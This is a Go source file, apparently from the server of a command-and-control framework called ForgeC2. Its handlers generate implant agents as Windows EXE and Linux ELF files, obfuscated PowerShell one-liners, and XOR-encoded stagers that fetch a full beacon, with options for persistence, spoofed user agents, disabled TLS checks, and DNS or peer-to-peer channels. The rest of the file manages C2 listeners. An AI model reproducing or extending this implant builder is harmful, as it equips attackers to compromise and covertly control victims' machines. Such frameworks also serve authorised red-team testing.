package server

import (
	"bytes"
	"fmt"
	"html/template"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/obfuscation"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleGeneratePage(c *gin.Context) {
	var listeners []db.Listener
	s.db.Where("enabled = ?", true).Find(&listeners)

	stats := s.getNavStats()
	data := gin.H{
		"Title":          "ForgeC2 - Generate Agent",
		"ActiveNav":      "generate",
		"DefaultInt":     s.cfg.Agent.DefaultInterval,
		"DefaultJitter":  s.cfg.Agent.DefaultJitter,
		"DefaultUA":      s.cfg.Agent.DefaultUA,
		"DefaultSkipTLS": s.cfg.Agent.DefaultSkipTLS,
		"Listeners":      listeners,
	}
	s.addUserToData(c, data)
	for k, v := range stats {
		data[k] = v
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "generate_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleGenerateEXE(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		P2PMode       string `form:"p2p_mode"`
		P2PParent     string `form:"p2p_parent"`
		P2PListenAddr string `form:"p2p_listen_addr"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Determine if P2P mode
	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	// Listener is required only for non-P2P, non-DNS
	if !isP2P && !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener or DNS domain is required"})
		return
	}

	if !isP2P && !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		transport := "http"
		if sch == "tcp" || sch == "tls" {
			transport = "tcp"
		} else if sch == "dns" {
			transport = "dns"
			form.DNSDomain = listener.Host
			// DNS server IP from listener host or config
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
		form.Protocol = transport
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	// Map P2P form values
	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	cfg := payload.AgentConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		P2PMode:       p2pMode,
		P2PParent:     p2pParent,
		P2PListenAddr: p2pListenAddr,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}
	outPath, err := payload.GenerateWindowsEXE(cfg, agentsDir)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if _, statErr := os.Stat(outPath); statErr != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "generated file not found: " + statErr.Error()})
		return
	}
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(outPath)))
	c.File(outPath)
}

func (s *Server) handleGenerateLinux(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		P2PMode       string `form:"p2p_mode"`
		P2PParent     string `form:"p2p_parent"`
		P2PListenAddr string `form:"p2p_listen_addr"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener or DNS domain is required"})
		return
	}

	if !isP2P && !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		transport := "http"
		if sch == "tcp" || sch == "tls" {
			transport = "tcp"
		} else if sch == "dns" {
			transport = "dns"
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
		form.Protocol = transport
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	cfg := payload.AgentConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		P2PMode:       p2pMode,
		P2PParent:     p2pParent,
		P2PListenAddr: p2pListenAddr,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}
	outPath, err := payload.GenerateLinuxELF(cfg, agentsDir)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if _, statErr := os.Stat(outPath); statErr != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "generated file not found: " + statErr.Error()})
		return
	}
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(outPath)))
	c.File(outPath)
}

func (s *Server) handleGeneratePS1(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Listener is required
	if form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener is required"})
		return
	}

	var listener db.Listener
	if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
		return
	}

	scheme := "http"
	if listener.Protocol == "https" || listener.Protocol == "tls" {
		scheme = "https"
	}
	if listener.Type == "tcp" {
		scheme = "tcp"
	}
	form.C2URL = fmt.Sprintf("%s://%s:%d", scheme, listener.Host, listener.Port)
	form.Protocol = scheme
	if scheme == "tcp" || scheme == "tls" {
		form.Protocol = "tcp"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.AgentConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
	}

	ps1Code, err := payload.GeneratePowerShellSource(cfg)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	oneLiner := obfuscation.GenerateCommandLineOneLiner(ps1Code)

	c.JSON(http.StatusOK, gin.H{
		"success":         true,
		"code":            oneLiner,
		"original_length": len(ps1Code),
		"obfuscated_len":  len(oneLiner),
	})
}

// Listener management
func (s *Server) handleListListeners(c *gin.Context) {
	var listeners []db.Listener
	s.db.Order("created_at desc").Find(&listeners)
	c.JSON(http.StatusOK, gin.H{"success": true, "data": listeners})
}

func (s *Server) handleListenerDetail(c *gin.Context) {
	id := c.Param("id")
	var listener db.Listener
	if err := s.db.First(&listener, id).Error; err != nil {
		c.String(http.StatusNotFound, "Listener not found")
		return
	}

	var agents []db.Agent
	s.db.Where("listener_id = ?", listener.ID).Order("last_seen desc").Find(&agents)

	activeCount := 0
	now := time.Now()
	for _, a := range agents {
		if now.Sub(a.LastSeen) < 5*time.Minute {
			activeCount++
		}
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":        fmt.Sprintf("ForgeC2 - Listener %s", listener.Name),
		"ActiveNav":    "listeners",
		"Listener":     listener,
		"Agents":       agents,
		"TotalAgents":  len(agents),
		"ActiveAgents": activeCount,
	}
	s.addUserToData(c, data)
	for k, v := range stats {
		data[k] = v
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "listener_detail_content", data); err != nil {
		slog.Error("Failed to render listener detail", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleCreateListener(c *gin.Context) {
	var l db.Listener
	if err := c.ShouldBindJSON(&l); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if l.Name == "" {
		l.Name = "Listener " + fmt.Sprintf("%d", l.Port)
	}

	// Normalize: prefer Scheme, derive Type and Protocol
	if l.Scheme != "" {
		l.Protocol = l.Scheme
		switch l.Scheme {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if l.Protocol != "" {
		l.Scheme = l.Protocol
		switch l.Protocol {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if l.Type != "" {
		switch l.Type {
		case "http":
			l.Scheme = "http"
			l.Protocol = "http"
		case "dns":
			l.Scheme = "dns"
			l.Protocol = "dns"
		default:
			l.Scheme = "tcp"
			l.Protocol = "tcp"
		}
	}

	l.Enabled = true
	if err := s.db.Create(&l).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true, "listener": l})
}

func (s *Server) handleUpdateListener(c *gin.Context) {
	id := c.Param("id")
	var l db.Listener
	if err := s.db.First(&l, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
		return
	}
	var updates struct {
		Name     string `json:"name"`
		Scheme   string `json:"scheme"`
		Type     string `json:"type"`
		Host     string `json:"host"`
		Port     int    `json:"port"`
		Protocol string `json:"protocol"`
		Notes    string `json:"notes"`
		Enabled  *bool  `json:"enabled"`
	}
	if err := c.ShouldBindJSON(&updates); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if updates.Name != "" {
		l.Name = updates.Name
	}
	if updates.Scheme != "" {
		l.Scheme = updates.Scheme
		l.Protocol = updates.Scheme
		switch updates.Scheme {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if updates.Protocol != "" {
		l.Protocol = updates.Protocol
		l.Scheme = updates.Protocol
		switch updates.Protocol {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if updates.Type != "" {
		l.Type = updates.Type
		switch updates.Type {
		case "http":
			l.Scheme = "http"
			l.Protocol = "http"
		case "dns":
			l.Scheme = "dns"
			l.Protocol = "dns"
		default:
			l.Scheme = "tcp"
			l.Protocol = "tcp"
		}
	}
	if updates.Host != "" {
		l.Host = updates.Host
	}
	if updates.Port != 0 {
		l.Port = updates.Port
	}
	if updates.Notes != "" {
		l.Notes = updates.Notes
	}
	if updates.Enabled != nil {
		l.Enabled = *updates.Enabled
	}
	if err := s.db.Save(&l).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true, "listener": l})
}

func (s *Server) handleDeleteListener(c *gin.Context) {
	id := c.Param("id")
	if err := s.db.Delete(&db.Listener{}, id).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (s *Server) handleGenerateStager(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	isDNS := form.DNSDomain != "" || form.DNSServer != ""
	if !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener is required"})
		return
	}

	if !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		if sch == "dns" {
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.AgentConfig{
		C2URL:         form.C2URL,
		Protocol:      "http",
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_stage.exe",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	// Generate the stage (full beacon EXE, XOR-encoded, base64-encoded)
	stagePath, xorKeyHex, err := payload.GenerateStage(cfg, agentsDir)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	// Use the C2 server address for the stager to download from
	stagerCfg := cfg
	stagerCfg.C2URL = form.C2URL
	stagerCfg.Filename = form.Filename // use user's desired filename for stager

	// Build the stager with C2URL and XORKey injected
	stagerPath, err := payload.GenerateStager(stagerCfg, agentsDir, xorKeyHex)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if _, statErr := os.Stat(stagerPath); statErr != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "stager not found: " + statErr.Error()})
		return
	}

	_ = stagePath // the stage file is already saved; serve the stager

	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(stagerPath)))
	c.File(stagerPath)
}

func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	isDNS := form.DNSDomain != "" || form.DNSServer != ""
	if !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener is required"})
		return
	}

	if !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		if sch == "dns" {
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.AgentConfig{
		C2URL:         form.C2URL,
		Protocol:      "http",
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_stage.exe",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	stagePath, xorKeyHex, err := payload.GenerateStage(cfg, agentsDir)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	stagerCfg := cfg
	stagerCfg.C2URL = form.C2URL
	stagerCfg.Filename = form.Filename

	stagerPath, err := payload.GenerateStagerLinux(stagerCfg, agentsDir, xorKeyHex)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if _, statErr := os.Stat(stagerPath); statErr != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "stager not found: " + statErr.Error()})
		return
	}

	_ = stagePath

	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(stagerPath)))
	c.File(stagerPath)
}

func (s *Server) handleListenersPage(c *gin.Context) {
	var listeners []db.Listener
	s.db.Order("created_at desc").Find(&listeners)

	enabled := 0
	httpC := 0
	tcpC := 0
	for _, l := range listeners {
		if l.Enabled {
			enabled++
		}
		if l.Type == "http" {
			httpC++
		} else if l.Type == "tcp" {
			tcpC++
		}
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":         "ForgeC2 - Listeners",
		"ActiveNav":     "listeners",
		"Listeners":     listeners,
		"Total":         len(listeners),
		"EnabledCount":  enabled,
		"HttpCount":     httpC,
		"TcpCount":      tcpC,
	}
	s.addUserToData(c, data)
	for k, v := range stats {
		data[k] = v
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "listeners_content", data); err != nil {
		slog.Error("Failed to render listeners content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}
